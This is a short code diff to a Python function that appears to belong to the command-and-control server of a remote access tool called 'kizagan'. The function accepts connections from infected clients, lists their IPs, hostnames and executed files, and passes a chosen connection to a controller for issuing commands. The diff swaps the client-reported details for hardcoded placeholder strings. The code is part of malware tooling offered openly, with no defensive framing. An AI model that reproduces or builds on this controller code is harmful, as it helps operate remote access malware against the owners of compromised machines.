@@ -27,11 +27,12 @@ def listen_port(ip, port):
             connection, addr = s.accept()
             connections.append(connection)
             addrs.append(addr)
-            host_name_with_abs_path = connection.recv(1024).decode()
-            delimiter = host_name_with_abs_path.split(":delimiter:")
-            client_list = client_list + f"{Fore.GREEN}[{Fore.LIGHTGREEN_EX}{index}{Fore.GREEN}]CLIENT_IP:{addr[0]} CLIENT_PORT:{addr[1]} HOSTNAME:{delimiter[0]} EXECUTED_FILE:{delimiter[1]}\n"
+            delimiter1 = "Hello"
+            delimiter2 = "C://"
+
+            client_list = client_list + f"{Fore.GREEN}[{Fore.LIGHTGREEN_EX}{index}{Fore.GREEN}]CLIENT_IP:{addr[0]} CLIENT_PORT:{addr[1]} HOSTNAME:{delimiter1} EXECUTED_FILE:{delimiter2}\n"
             print(f"""
-{Fore.LIGHTGREEN_EX}[ESTABLISHED]{Fore.BLUE}CLIENT_IP:{addr[0]} CLIENT_PORT:{addr[1]} HOSTNAME:{delimiter[0]} EXECUTEDFILE:{delimiter[1]}""")
+{Fore.LIGHTGREEN_EX}[ESTABLISHED]{Fore.BLUE}CLIENT_IP:{addr[0]} CLIENT_PORT:{addr[1]} HOSTNAME:{delimiter1} EXECUTEDFILE:{delimiter2}""")
             index = index + 1
             if os.name == "nt":
                 sys.stdin.read()
@@ -65,7 +66,7 @@ def listen_port(ip, port):
                 for i in range(0, (index - 1)):
                     connections[i].send("exit".encode())
                 return 0
-            server = kizagan_server.Server(connections[client_choice], addrs[client_choice], delimiter[0], delimiter[2])
+            server = kizagan_server.Server(connections[client_choice], addrs[client_choice], delimiter1, delimiter2)
             print(f"{Fore.LIGHTGREEN_EX}[!]Connected to {addrs[client_choice][0]}:{addrs[client_choice][1]}!")
             server.main()
             return 0
